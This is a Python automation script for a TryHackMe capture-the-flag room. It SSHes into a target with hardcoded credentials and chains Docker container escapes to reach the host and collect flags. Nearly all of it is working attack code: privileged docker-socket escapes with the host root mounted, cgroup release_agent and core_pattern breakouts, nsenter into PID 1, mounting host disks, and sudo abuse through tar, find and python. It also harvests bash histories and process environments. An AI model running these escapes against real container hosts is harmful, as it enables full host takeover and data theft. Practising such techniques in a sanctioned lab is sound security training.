#!/usr/bin/env python3
"""
Matryoshka Containment Unit - automated escape & flag hunter.

Stages:
  1. SSH in as matryoshka@TARGET
  2. Recon Layer 1 (inner container) -> find Level 2 flag, detect escape vector
  3. Auto-escape to Layer 2 -> find Level 3 flag
  4. Auto-escape to Layer 3 / host -> find Host flag

Requires: paramiko  (pip install paramiko)
Run inside the active TryHackMe VPN.
"""

from __future__ import annotations
import re
import sys
import time
import shlex
import textwrap
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("[!] paramiko missing -> pip install paramiko")
    sys.exit(1)

TARGET = "10.112.139.147"
USER = "matryoshka"
PASS = "n03sk@p3"
PORT = 22

OUT = Path(__file__).parent / "loot"
OUT.mkdir(exist_ok=True)

FLAG_RE = re.compile(r"(?:THM\{[^}\s]+\}|flag\{[^}\s]+\})", re.IGNORECASE)

# ---------- recon payload (runs in any layer) ----------
RECON = r"""
echo '===HOST==='; hostname; uname -a; id; whoami
echo '===MARKERS==='
[ -f /.dockerenv ] && echo dockerenv:YES || echo dockerenv:no
cat /proc/1/cgroup 2>/dev/null
echo '===CAPS==='
grep -E '^Cap' /proc/self/status
command -v capsh >/dev/null && capsh --print 2>/dev/null | grep -i bound
echo '===MOUNTS==='
mount | grep -vE '^(proc|sysfs|cgroup|tmpfs|devpts|mqueue|securityfs|pstore|bpf|tracefs|debugfs|configfs|fusectl|hugetlbfs|nsfs|ramfs|overlay)'
echo '===BLOCKDEV==='
ls -la /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* /dev/loop* 2>/dev/null
lsblk 2>/dev/null
echo '===DOCKER==='
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null
command -v docker
echo '===SUDO==='
sudo -n -l 2>&1 | head -20
echo '===SUID==='
find / -perm -4000 -type f 2>/dev/null | head -40
echo '===WRITE==='
ls -la /sys/fs/cgroup 2>/dev/null | head -5
echo '===HOMES==='
ls -la / /root /home /opt /srv 2>/dev/null
echo '===FLAGS==='
find / -maxdepth 6 \( -iname 'flag*' -o -iname '*flag.txt' -o -iname 'level*' \) 2>/dev/null | head -40
echo '===HISTORY==='
cat ~/.bash_history 2>/dev/null | tail -40
cat /root/.bash_history 2>/dev/null | tail -40
echo '===NET==='
ip a 2>/dev/null | grep -E 'inet |^[0-9]'
echo '===END==='
"""


def banner(t: str) -> None:
    print(f"\n{'=' * 8} {t} {'=' * 8}")


def connect() -> paramiko.SSHClient:
    print(f"[+] ssh {USER}@{TARGET}")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(TARGET, port=PORT, username=USER, password=PASS,
              look_for_keys=False, allow_agent=False, timeout=20)
    return c


NOISE_RE = re.compile(
    r"(?im)^(?:the input device is not a tty|mesg:.*|stty:.*|"
    r"bash: cannot set terminal process group.*|"
    r"bash: no job control in this shell.*)\s*$"
)


def _clean(text: str) -> str:
    text = text.replace("\r\n", "\n").replace("\r", "\n")
    text = NOISE_RE.sub("", text)
    return text


def run(client: paramiko.SSHClient, cmd: str, timeout: int = 60,
        pty: bool = True) -> str:
    """Run a single shell command via interactive shell with sentinel parsing.
    Avoids the 'login shell hangs' issue when exec_command+PTY keeps the
    channel open on this box."""
    return _shell_run(client, cmd, timeout=timeout)


_SHELL = {"chan": None}
_PROMPT_TAG = "__MH_PROMPT__"


def _ensure_shell(client: paramiko.SSHClient):
    chan = _SHELL.get("chan")
    if chan is not None and chan.get_transport() and chan.get_transport().is_active() and not chan.closed:
        return chan
    chan = client.invoke_shell(term="xterm", width=200, height=50)
    chan.settimeout(2)
    # drain banner / motd
    deadline = time.time() + 3
    while time.time() < deadline:
        try:
            data = chan.recv(65536)
            if not data:
                break
        except Exception:
            break
    # set deterministic prompt + disable history/echo noise
    init = (
        f"export PS1='{_PROMPT_TAG}'; "
        "unset PROMPT_COMMAND; "
        "stty -echo 2>/dev/null; "
        "set +o history 2>/dev/null; "
        "echo READY\n"
    )
    chan.send(init)
    _read_until(chan, "READY", timeout=5)
    _read_until(chan, _PROMPT_TAG, timeout=5)
    _SHELL["chan"] = chan
    return chan


def _read_until(chan, marker: str, timeout: int = 60) -> str:
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = chan.recv(65536)
            if not data:
                time.sleep(0.05)
                continue
            buf += data.decode(errors="replace")
            if marker in buf:
                return buf
        except Exception:
            time.sleep(0.05)
    return buf


def _shell_run(client: paramiko.SSHClient, cmd: str, timeout: int = 60) -> str:
    chan = _ensure_shell(client)
    start = "__MH_START__"
    end = "__MH_END__"
    # send a single line that prints sentinels around the command output
    line = f"echo {start}; {{ {cmd}; }} 2>&1; echo {end}_$?\n"
    chan.send(line)
    raw = _read_until(chan, end + "_", timeout=timeout)
    # extract between sentinels
    m = re.search(re.escape(start) + r"\r?\n(.*?)" + re.escape(end) + r"_(\d+)",
                  raw, re.S)
    if not m:
        return _clean(raw)
    body = m.group(1)
    # consume trailing prompt
    _read_until(chan, _PROMPT_TAG, timeout=2)
    return _clean(body)


def run_script(client: paramiko.SSHClient, script: str, timeout: int = 240,
               remote_path: str = "/tmp/.mhunt.sh") -> str:
    """Encode the script as base64 and decode it on the remote in one line,
    then bash-execute. Uses the persistent interactive shell."""
    import base64
    payload = ("#!/bin/bash\nset +e\n" + script).replace("\r\n", "\n").encode("utf-8")
    b64 = base64.b64encode(payload).decode()
    # one liner; no heredoc needed since base64 is safe
    cmd = (
        f"echo {b64} | base64 -d > {remote_path} && "
        f"chmod +x {remote_path} && bash {remote_path}"
    )
    return _shell_run(client, cmd, timeout=timeout)


def grab_flags(text: str, label: str) -> list[str]:
    flags = sorted(set(FLAG_RE.findall(text)))
    if flags:
        print(f"[★] flags in {label}:")
        for f in flags:
            print(f"    {f}")
    return flags


def detect_vector(recon: str) -> str:
    """Return one of: docker_sock | privileged_caps | host_disk | sudo | unknown"""
    # docker socket present and accessible
    if re.search(r"srw[-rwx]+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s*/(?:var/)?run/docker\.sock", recon):
        return "docker_sock"
    if "/var/run/docker.sock" in recon and "srw" in recon:
        return "docker_sock"
    caps = re.search(r"CapEff:\s*([0-9a-f]+)", recon)
    if caps:
        val = int(caps.group(1), 16)
        # CAP_SYS_ADMIN = 21
        if val & (1 << 21):
            if re.search(r"/dev/(sd|vd|nvme|xvd)", recon):
                return "host_disk"
            return "privileged_caps"
    if re.search(r"NOPASSWD", recon):
        return "sudo"
    if re.search(r"/dev/(sd|vd|nvme|xvd)", recon):
        return "host_disk"
    return "unknown"


# ---------- escape payloads ----------

ESCAPE_DOCKER_SOCK = r"""
set +e
echo '[*] docker sock escape'
echo '=== docker images ==='
docker images
echo '=== docker ps -a ==='
docker ps -a
# pick clean image (no USER override) - prefer common bases over the matryoshka images
IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null \
      | grep -viE '<none>|matryoshka' | grep -iE '^(alpine|busybox|ubuntu|debian)' | head -1)
[ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
echo "[*] using image: $IMG"
docker run --rm --privileged --pid=host --net=host --user 0:0 \
    -v /:/hostfs $IMG sh -c '
      set +e
      echo "===INSIDE_NEW_LAYER===";
      hostname; id; uname -a;
      echo "--- /hostfs root ---";
      ls -la /hostfs;
      echo "--- /hostfs/root ---";
      ls -la /hostfs/root 2>/dev/null;
      echo "--- /hostfs/home ---";
      ls -la /hostfs/home 2>/dev/null;
      echo "--- /hostfs/opt ---";
      ls -la /hostfs/opt 2>/dev/null;
      echo "--- /hostfs/srv ---";
      ls -la /hostfs/srv 2>/dev/null;
      echo "--- find flag files ---";
      find /hostfs -xdev -maxdepth 6 -type f \
           \( -iname "flag*" -o -iname "*flag.txt" -o -iname "level*" \) \
           2>/dev/null | grep -v "/sys/" | grep -v "/proc/" | head -40;
      echo "--- grep THM{} content ---";
      grep -rohaE "THM\{[^}]+\}|flag\{[^}]+\}" \
           /hostfs/root /hostfs/home /hostfs/opt /hostfs/srv /hostfs/etc \
           /hostfs/var/log /hostfs/tmp 2>/dev/null | head -20;
      echo "--- bash history ---";
      cat /hostfs/root/.bash_history 2>/dev/null | tail -30;
      cat /hostfs/home/*/.bash_history 2>/dev/null | tail -30;
      echo "--- motd / issue ---";
      cat /hostfs/etc/motd /hostfs/etc/issue 2>/dev/null;
      echo "--- common flag paths ---";
      for f in /hostfs/root/flag.txt /hostfs/root/flag2.txt /hostfs/root/flag3.txt \
               /hostfs/root/level2.txt /hostfs/root/level3.txt /hostfs/root/host.txt \
               /hostfs/flag.txt /hostfs/flag2.txt /hostfs/flag3.txt \
               /hostfs/level2.txt /hostfs/level3.txt /hostfs/host.txt \
               /hostfs/home/*/flag*.txt /hostfs/opt/flag*.txt /hostfs/srv/flag*.txt; do
        [ -f "$f" ] && { echo "==FILE:$f=="; cat "$f"; }
      done;
      echo "--- inner docker.sock (DinD) ---";
      ls -la /hostfs/var/run/docker.sock /hostfs/run/docker.sock 2>/dev/null;
      if [ -S /hostfs/run/docker.sock ] || [ -S /hostfs/var/run/docker.sock ]; then
        SOCK=/hostfs/run/docker.sock
        [ -S /hostfs/var/run/docker.sock ] && SOCK=/hostfs/var/run/docker.sock
        echo "[*] inner daemon at $SOCK";
        DOCKER_HOST=unix://$SOCK docker images 2>/dev/null;
        DOCKER_HOST=unix://$SOCK docker ps -a 2>/dev/null;
        for c in $(DOCKER_HOST=unix://$SOCK docker ps -aq 2>/dev/null); do
          echo "--- inspect $c ---";
          DOCKER_HOST=unix://$SOCK docker inspect $c 2>/dev/null \
            | grep -E "Env|Labels|Image|Cmd|Mounts|Hostname" | head -30;
        done
      fi
      echo "--- env of running matryoshka-level1 (this layer1 image) ---";
      docker inspect $(docker ps -aq) 2>/dev/null \
        | grep -E "THM\{|flag|FLAG|Level" | head -20;
      echo "--- image labels/env ---";
      for img in $(docker images --format "{{.Repository}}:{{.Tag}}" 2>/dev/null | grep -v "<none>"); do
        echo "==IMG:$img==";
        docker inspect $img 2>/dev/null | grep -E "THM\{|flag|FLAG|Level|Env|Labels" | head -10;
      done
      echo "--- /hostfs cgroup ---";
      cat /hostfs/proc/1/cgroup 2>/dev/null | head -3;
      echo "--- network ---";
      ip a 2>/dev/null | grep inet;
      echo "===END_NEW_LAYER==="
    '
"""

ESCAPE_PRIVILEGED_CGROUP = r"""
set -e
echo '[*] cgroup release_agent escape'
d=$(mktemp -d)
mount -t cgroup -o rdma cgroup $d 2>/dev/null || mount -t cgroup -o memory cgroup $d
mkdir -p $d/x
echo 1 > $d/x/notify_on_release
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
[ -z "$host_path" ] && host_path=$(sed -n 's/^.* on \(\/\) .*/\1/p' /etc/mtab | head -1)
cat >/tmp/cmd.sh <<'EOF'
#!/bin/sh
{ hostname; id;
  find / -maxdepth 5 -iname 'flag*' 2>/dev/null;
  cat /root/flag.txt 2>/dev/null;
  cat /flag*.txt 2>/dev/null;
} > /tmp/escape_out 2>&1
EOF
chmod +x /tmp/cmd.sh
echo "$host_path/tmp/cmd.sh" > $d/release_agent
sh -c "echo \$\$ > $d/x/cgroup.procs"
sleep 2
cat /tmp/escape_out 2>/dev/null
"""

ESCAPE_HOST_DISK = r"""
set -e
echo '[*] mount host disk escape'
DEV=$(ls /dev/sda1 /dev/vda1 /dev/nvme0n1p1 /dev/xvda1 2>/dev/null | head -1)
[ -z "$DEV" ] && DEV=$(lsblk -nr -o NAME,TYPE | awk '$2=="part"{print "/dev/"$1; exit}')
echo "[*] device=$DEV"
mkdir -p /mnt/host
mount $DEV /mnt/host || mount -o ro $DEV /mnt/host
ls /mnt/host
find /mnt/host -maxdepth 5 -iname 'flag*' 2>/dev/null
cat /mnt/host/root/flag.txt 2>/dev/null
cat /mnt/host/flag*.txt 2>/dev/null
"""

ESCAPE_SUDO = r"""
echo '[*] sudo enumeration'
sudo -n -l
# generic: try mount/docker/runc/find/vi via sudo
for c in docker runc mount tar bash sh find vi vim less more nmap python python3 perl ruby; do
  sudo -n -l 2>/dev/null | grep -q " $c" && {
    echo "[*] abusable: $c"
    case $c in
      docker) sudo -n docker run --rm --privileged -v /:/hostfs alpine cat /hostfs/root/flag.txt ;;
      find)   sudo -n find . -exec cat /root/flag.txt \; -quit ;;
      bash|sh) sudo -n $c -c 'cat /root/flag.txt; find / -maxdepth 5 -iname flag* 2>/dev/null' ;;
      tar)    sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/flag.txt' ;;
      python|python3) sudo -n $c -c 'import os;print(open("/root/flag.txt").read());os.system("find / -maxdepth 5 -iname flag*")' ;;
    esac
    break
  }
done
"""


def docker_run_with_script(script: str, mount_root: str = "/", inner_chroot: bool = False) -> str:
    """Build a `docker run ...` command that injects `script` (base64) and
    runs it. If inner_chroot=True, the script runs *inside* /hostfs via chroot
    (i.e., as root in the docker daemon's host filesystem)."""
    import base64
    payload = ("#!/bin/sh\nset +e\n" + script).replace("\r\n", "\n").encode()
    b64 = base64.b64encode(payload).decode()
    if inner_chroot:
        # alpine has base64 + chroot
        inner = (
            f"echo {b64} | base64 -d > /hostfs/tmp/.mh_inner.sh && "
            f"chmod +x /hostfs/tmp/.mh_inner.sh && "
            f"chroot /hostfs sh /tmp/.mh_inner.sh"
        )
    else:
        inner = f"echo {b64} | base64 -d | sh"
    return (
        "docker run --rm --privileged --pid=host --net=host --user 0:0 "
        f"-v {mount_root}:/hostfs alpine:3.20 sh -c " + shlex.quote(inner)
    )


# Recon used inside a layer (when we already have root + know /hostfs).
# Probes the *host* (Layer N+1) by inspecting /hostfs.
RECON_FROM_HOSTFS = r"""
echo '===HOSTFS_HOST==='
cat /hostfs/etc/hostname 2>/dev/null
cat /hostfs/proc/1/cgroup 2>/dev/null
cat /hostfs/proc/self/status 2>/dev/null | grep -E '^(Cap|Name)'
echo '===HOSTFS_DOCKERENV==='
ls -la /hostfs/.dockerenv 2>/dev/null
echo '===HOSTFS_SOCKETS==='
find /hostfs -maxdepth 4 -name '*.sock' -type s 2>/dev/null | head -20
ls -la /hostfs/var/run/docker.sock /hostfs/run/docker.sock 2>/dev/null
ls -la /hostfs/host /hostfs/outer /hostfs/parent 2>/dev/null
echo '===HOSTFS_BLOCKDEV==='
ls -la /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* 2>/dev/null
echo '===HOSTFS_MOUNTS==='
cat /hostfs/proc/mounts 2>/dev/null | grep -vE '^(proc|sysfs|cgroup|tmpfs|devpts|mqueue|securityfs|pstore|bpf|tracefs|debugfs|configfs|fusectl|hugetlbfs|nsfs|ramfs|overlay)' | head -30
echo '===HOSTFS_CAPS_OF_PID1==='
grep -E '^Cap' /hostfs/proc/1/status 2>/dev/null
echo '===HOSTFS_FLAGS==='
find /hostfs -xdev -maxdepth 5 -type f \( -iname 'flag*' -o -iname '*flag.txt' -o -iname 'level*' -o -iname 'host*flag*' \) 2>/dev/null | grep -vE '/(sys|proc)/' | head -40
echo '===HOSTFS_GREP_FLAGS==='
grep -rohaE 'THM\{[^}]+\}' /hostfs/root /hostfs/home /hostfs/opt /hostfs/srv /hostfs/etc /hostfs/var/log /hostfs/tmp 2>/dev/null | head -20
echo '===HOSTFS_HISTORY==='
cat /hostfs/root/.bash_history 2>/dev/null | tail -30
cat /hostfs/home/*/.bash_history 2>/dev/null | tail -30
echo '===HOSTFS_ENTRYPOINTS==='
cat /hostfs/usr/local/bin/level*-entrypoint.sh 2>/dev/null
cat /hostfs/entrypoint*.sh 2>/dev/null
cat /hostfs/start*.sh 2>/dev/null
echo '===HOSTFS_END==='
"""


def detect_vector_from_hostfs(text: str) -> str:
    """Detect escape vector based on RECON_FROM_HOSTFS output."""
    if re.search(r"/hostfs/(?:var/)?run/docker\.sock", text) and "srw" in text:
        # there's another docker.sock inside the next layer
        return "docker_sock_nested"
    # CAP_SYS_ADMIN of /hostfs PID1
    m = re.search(r"^CapEff:\s*([0-9a-f]+)", text, re.M)
    if m and (int(m.group(1), 16) & (1 << 21)):
        if re.search(r"/dev/(sd|vd|nvme|xvd)", text):
            return "host_disk"
        return "privileged_caps"
    if re.search(r"/dev/(sd|vd|nvme|xvd)", text):
        return "host_disk"
    return "unknown"


ESCAPE_LAYER2_TO_HOST = r"""
set +e
echo '======= LAYER2->HOST MULTI-VECTOR ========'
echo '--- our caps ---'
grep -E '^Cap' /proc/self/status
command -v capsh >/dev/null && capsh --print 2>/dev/null | head -10

echo '--- /dev contents ---'
ls -la /dev | head -40
ls -la /dev/disk 2>/dev/null
ls -la /dev/disk/by-uuid 2>/dev/null
ls -la /dev/disk/by-label 2>/dev/null
readlink -f /dev/root 2>/dev/null

echo '--- host pid visibility ---'
ps -ef 2>/dev/null | head -20
ls /proc | grep -E '^[0-9]+$' | wc -l

echo '--- /hostfs/proc/1/environ (layer2 PID1 env) ---'
cat -v /hostfs/proc/1/environ 2>/dev/null | tr "\0" "\n" | head -40

echo '--- /proc/1/environ (our pid1 - host of dockerd) ---'
cat -v /proc/1/environ 2>/dev/null | tr "\0" "\n" | head -40

echo '--- /proc/1/cgroup (our PID 1 = host PID 1 since --pid=host) ---'
cat /proc/1/cgroup 2>/dev/null

echo '--- /proc/1/cmdline ---'
cat /proc/1/cmdline 2>/dev/null | tr "\0" " "; echo

echo '--- /proc/1/root ---'
ls -la /proc/1/root 2>/dev/null | head
ls /proc/1/root 2>/dev/null

echo '--- /proc/1/mountinfo head ---'
head -40 /proc/1/mountinfo 2>/dev/null

echo '--- look for OTHER docker.sock OR THM flag in /proc/*/root ---'
for p in $(ls /proc | grep -E '^[0-9]+$' | head -50); do
  R=/proc/$p/root
  [ -r $R/etc/hostname ] && {
    HN=$(cat $R/etc/hostname 2>/dev/null)
    [ -n "$HN" ] && echo "pid=$p hostname=$HN"
  }
done | sort -u | head -30

echo '--- search ALL pids for host flag content ---'
grep -rohaE 'THM\{[^}]+\}' /proc/*/environ /proc/*/cmdline 2>/dev/null | sort -u | head

echo '======= VECTOR A: core_pattern (init userns) ========'
ORIG=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
echo "original core_pattern: $ORIG"
if [ -w /proc/sys/kernel/core_pattern ]; then
  echo '[+] core_pattern is WRITABLE - escape possible'
  # find the path of /tmp on host (initial mountns view)
  # method: write a script in our /tmp, find corresponding host path via overlay upperdir
  HOST_TMP=$(awk '$5 ~ /\/tmp$/ && $1=="/" {print $4}' /proc/self/mountinfo 2>/dev/null | head -1)
  echo "host /tmp mapping: $HOST_TMP"
  # find OUR rootfs upperdir on the host
  ROOT_UPPER=$(awk '$5=="/" {for(i=7;i<=NF;i++) if($i ~ /^upperdir=/) {sub("upperdir=","",$i); print $i}}' /proc/self/mountinfo 2>/dev/null | head -1)
  echo "our overlay upperdir on host: $ROOT_UPPER"
  if [ -n "$ROOT_UPPER" ]; then
    HPATH="$ROOT_UPPER/tmp/escape.sh"
  else
    # fallback: look at our root device mount
    HPATH=$(findmnt -no SOURCE / 2>/dev/null)
    echo "fallback root source: $HPATH"
  fi
  cat > /tmp/escape.sh <<'EOF'
#!/bin/sh
{
  date
  hostname
  id
  uname -a
  ls -la /
  ls -la /root
  cat /root/flag*.txt 2>/dev/null
  cat /flag*.txt 2>/dev/null
  cat /level3*.txt 2>/dev/null
  cat /host*.txt 2>/dev/null
  find / -xdev -maxdepth 5 -type f \( -iname 'flag*' -o -iname 'level*' -o -iname 'host*' \) 2>/dev/null | head -40
  grep -rohaE 'THM\{[^}]+\}' /root /home /opt /srv /etc 2>/dev/null | head
} > /tmp/.host_escape_out 2>&1
EOF
  chmod +x /tmp/escape.sh
  if [ -n "$ROOT_UPPER" ] && [ -e "$ROOT_UPPER/tmp/escape.sh" ]; then
    echo "|$ROOT_UPPER/tmp/escape.sh %P" > /proc/sys/kernel/core_pattern
    echo "set core_pattern -> |$ROOT_UPPER/tmp/escape.sh %P"
  else
    # generic try: kernel resolves path in init mountns, try /tmp directly
    echo "|/tmp/escape.sh %P" > /proc/sys/kernel/core_pattern
    echo "set core_pattern -> |/tmp/escape.sh %P"
  fi
  cat /proc/sys/kernel/core_pattern
  # trigger a crash
  ulimit -c unlimited
  apk add --no-cache gcc musl-dev >/dev/null 2>&1
  cat > /tmp/crash.c <<'EOF'
#include <signal.h>
int main(){ raise(SIGSEGV); return 0; }
EOF
  if command -v cc >/dev/null; then
    cc /tmp/crash.c -o /tmp/crash 2>/dev/null && /tmp/crash
  else
    # use python
    python3 -c "import os,signal; os.kill(os.getpid(), signal.SIGSEGV)" 2>/dev/null
    python  -c "import os,signal; os.kill(os.getpid(), signal.SIGSEGV)" 2>/dev/null
    # last resort: sh + segfault via huge recursion - unreliable
    sh -c 'kill -SEGV $$' 2>/dev/null
  fi
  sleep 3
  # try multiple host paths to read result
  echo "--- escape output ---"
  for p in /tmp/.host_escape_out "$ROOT_UPPER/tmp/.host_escape_out" /hostfs/tmp/.host_escape_out; do
    [ -f "$p" ] && { echo "==FROM $p=="; cat "$p"; }
  done
  # restore
  echo "$ORIG" > /proc/sys/kernel/core_pattern 2>/dev/null
else
  echo '[-] core_pattern not writable'
fi

echo '======= VECTOR B: nsenter to PID 1 ========'
if command -v nsenter >/dev/null; then
  nsenter -t 1 -m -u -i -n -p sh -c '
    hostname; id; pwd; ls /;
    cat /root/flag*.txt 2>/dev/null;
    cat /flag*.txt 2>/dev/null;
    find / -xdev -maxdepth 5 -iname flag\* 2>/dev/null | head;
    grep -rohaE "THM\{[^}]+\}" /root /home /opt /srv /etc 2>/dev/null | head
  ' 2>&1 | head -60
else
  echo 'nsenter not available'
fi

echo '======= VECTOR C: mount /dev/root or block device ========'
for D in /dev/root /dev/sda1 /dev/sda2 /dev/vda1 /dev/vda2 /dev/nvme0n1p1 /dev/xvda1 $(readlink -f /dev/root 2>/dev/null); do
  [ -b "$D" ] || continue
  echo "[*] try mount $D"
  mkdir -p /mnt/realhost
  mount -o ro $D /mnt/realhost 2>&1 | head -3
  if mountpoint -q /mnt/realhost 2>/dev/null; then
    echo "[+] mounted $D"
    ls /mnt/realhost
    find /mnt/realhost -xdev -maxdepth 5 -type f \( -iname 'flag*' -o -iname 'level*' -o -iname 'host*' \) 2>/dev/null | head
    grep -rohaE 'THM\{[^}]+\}' /mnt/realhost/root /mnt/realhost/home /mnt/realhost/opt 2>/dev/null | head
    umount /mnt/realhost
    break
  fi
done

echo '======= DONE ========'
"""



def main() -> None:
    client = connect()
    all_flags: dict[str, list[str]] = {}

    # ---- connectivity sanity ----
    banner("CONNECTIVITY TEST")
    sanity = run(client, "id; hostname; echo __SHELL_OK__", timeout=15)
    print(sanity)
    if "__SHELL_OK__" not in sanity:
        print("[!] remote shell does not echo properly - aborting")
        client.close()
        return

    # ---- Layer 1 (our SSH session) ----
    banner("LAYER 1 RECON")
    r1 = run_script(client, RECON)
    (OUT / "layer1_recon.txt").write_text(r1, encoding="utf-8")
    print(r1[:3000] + ("\n... [truncated]" if len(r1) > 3000 else ""))
    all_flags["layer1"] = grab_flags(r1, "layer1 recon")

    vec1 = detect_vector(r1)
    print(f"[+] layer1 escape vector -> {vec1}")
    if vec1 != "docker_sock":
        print("[!] this layer's only known automation is docker_sock; aborting")
        client.close()
        return

    # ---- Escape Layer 1 -> Layer 2 (via Layer1 docker.sock) ----
    banner("ESCAPE LAYER1 -> LAYER2 (docker_sock)")
    e2 = run_script(client, ESCAPE_DOCKER_SOCK, timeout=240)
    (OUT / "layer2_escape.txt").write_text(e2, encoding="utf-8")
    print(e2[:3000] + ("\n... [truncated]" if len(e2) > 3000 else ""))
    all_flags["layer2"] = grab_flags(e2, "layer2 escape")

    # ---- Layer 2 recon: chroot into /hostfs (Layer 2's real filesystem) ----
    banner("LAYER 2 RECON (chroot into /hostfs)")
    cmd_l2 = docker_run_with_script(RECON_FROM_HOSTFS, mount_root="/")
    r2 = _shell_run(client, cmd_l2, timeout=300)
    (OUT / "layer2_recon.txt").write_text(r2, encoding="utf-8")
    print(r2[:3000] + ("\n... [truncated]" if len(r2) > 3000 else ""))
    all_flags.setdefault("layer2", []).extend(grab_flags(r2, "layer2 recon"))

    vec2 = detect_vector_from_hostfs(r2)
    print(f"[+] layer2 escape vector -> {vec2}")

    # ---- Escape Layer 2 -> Host (multi-vector) ----
    banner("ESCAPE LAYER2 -> HOST (multi-vector)")
    e3 = _shell_run(
        client,
        docker_run_with_script(ESCAPE_LAYER2_TO_HOST),
        timeout=480,
    )
    (OUT / "host_escape.txt").write_text(e3, encoding="utf-8")
    print(e3[:6000])
    all_flags["layer3_or_host"] = grab_flags(e3, "host escape")

    # ---- nested-sock probing (kept for reference) ----
    if False and vec2 == "docker_sock_nested":
        banner("ESCAPE LAYER2 -> LAYER3 (nested docker.sock)")
        # In Layer 2's filesystem the inner docker.sock is at /run/docker.sock or
        # /var/run/docker.sock. From our spawn (hostfs=Layer2), it's at
        # /hostfs/run/docker.sock. We need to talk to *that* socket. Strategy:
        # spawn a NEW container via Layer 2's daemon (this is the same socket
        # we already used). To reach Layer 3 we have to find Layer 3's socket
        # mounted INSIDE Layer 2. Look for it: list all sockets under /hostfs.
        find_socks = _shell_run(
            client,
            docker_run_with_script(
                "find /hostfs -maxdepth 6 -name '*.sock' -type s 2>/dev/null; "
                "ls -la /hostfs/host /hostfs/outer /hostfs/parent 2>/dev/null; "
                "cat /hostfs/proc/1/mountinfo 2>/dev/null | grep -i sock | head"
            ),
            timeout=120,
        )
        (OUT / "layer2_socks.txt").write_text(find_socks, encoding="utf-8")
        print(find_socks)

        # Try most-likely nested-socket paths
        candidate_socks = re.findall(r"/hostfs\S*\.sock", find_socks)
        candidate_socks = sorted(set(candidate_socks))
        print(f"[*] candidate sockets in /hostfs: {candidate_socks}")
        # filter out the one we already used
        candidate_socks = [s for s in candidate_socks
                           if not s.endswith("/run/docker.sock")
                           and not s.endswith("/var/run/docker.sock")]
        # actually the layer2->layer3 socket COULD also be at /run/docker.sock
        # if it's bind-mounted from layer3. Try all of them anyway.
        all_candidates = sorted(set(re.findall(r"/hostfs\S*\.sock", find_socks)))

        nested_script = (
            "for S in " + " ".join(shlex.quote(s) for s in all_candidates) + "; do\n"
            "  echo \"==TRY $S==\"\n"
            "  curl -s --max-time 5 --unix-socket $S http://localhost/version 2>/dev/null && echo\n"
            "done\n"
        )
        sock_probe = _shell_run(
            client,
            docker_run_with_script(nested_script + "\napk add curl >/dev/null 2>&1; " + nested_script),
            timeout=180,
        )
        (OUT / "layer2_sock_probe.txt").write_text(sock_probe, encoding="utf-8")
        print(sock_probe)

        # If a sock other than the obvious one responds with a different
        # docker version/host, escape via that. Otherwise: try the privileged
        # cgroup release_agent escape from inside the alpine layer (it has
        # CAP_SYS_ADMIN since we used --privileged).
        banner("ESCAPE LAYER2 -> HOST (cgroup release_agent via privileged alpine)")
        e3 = _shell_run(
            client,
            docker_run_with_script(ESCAPE_PRIVILEGED_CGROUP),
            timeout=240,
        )
        (OUT / "host_escape.txt").write_text(e3, encoding="utf-8")
        print(e3[:4000])
        all_flags["layer3_or_host"] = grab_flags(e3, "host escape")

    # ---- Summary ----
    banner("SUMMARY")
    for layer, flags in all_flags.items():
        print(f"  {layer}: {flags or '(none)'}")
    print(f"\n[*] all output dumped under {OUT}")
    client.close()


if __name__ == "__main__":
    main()
